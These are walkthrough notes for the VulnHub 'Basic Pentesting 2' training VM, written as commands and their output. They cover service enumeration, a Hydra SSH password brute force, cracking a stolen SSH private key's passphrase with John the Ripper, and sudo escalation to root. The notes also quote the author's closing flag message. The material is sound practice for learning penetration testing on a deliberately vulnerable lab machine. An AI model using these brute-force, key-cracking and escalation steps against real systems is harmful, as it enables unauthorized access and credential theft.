https://www.vulnhub.com/entry/basic-pentesting-2,241/
Boot 2 Root

//TODO:
  Find J's password in /etc/shadow (easy hash) 
     --> user: jan || pass: armando
 

ip address: 192.168.83.113
ports:
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Website
Undergoing maintenace
 Check our dev note section if you need to know what to work on. 
192.168.83.113/development
 (see notes in /Web)

root@kali:~/Desktop/VulnHub/Basic Pentesting: 2# enum4linux 192.168.83.113
  Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
  (also: kay, jan (**weak password**)
[+] Got domain/workgroup name: WORKGROUP
[+] Found domain(s):

	[+] BASIC2
	[+] Builtin
[+] Password Info for Domain: BASIC2

	[+] Minimum password length: 5


Hydra for SSH

# hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.83.113 ssh
[22][ssh] host: 192.168.83.113   login: jan   password: armando


SSH
jan@192.168.83.113 password: armando

uid=1001(jan) gid=1001(jan) groups=1001(jan)

no items for jan

user: kay - has private key /home/kay/.ssh/id_rsa 

jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@localhost
 *need password*

root@kali:~/Desktop/VulnHub/Basic Pentesting: 2/Keys# ssh2john kay_private_key > JOHN_kay_private_key
root@kali:~/Desktop/VulnHub/Basic Pentesting: 2/Keys# john --wordlist=/usr/share/wordlists/rockyou.txt JOHN_kay_private_key 
  password: beeswax

can't login from remote, login with jan and switch over
jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@localhost

kay@basic2:~$ id
uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

kay@basic2:~$ sudo -i

root@basic2:/# whoami
root
root@basic2:/# id
uid=0(root) gid=0(root) groups=0(root)
root@basic2:/# 


root@basic2:~# cat flag.txt 
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!


